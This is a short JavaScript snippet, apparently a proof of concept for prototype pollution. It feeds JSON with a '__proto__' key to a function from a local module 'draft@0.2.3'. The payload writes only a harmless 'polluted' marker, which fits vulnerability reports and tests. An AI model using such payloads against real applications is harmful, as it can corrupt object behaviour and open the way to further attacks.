const draft = require('./draft@0.2.3')
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}')
draft(undefined, payload)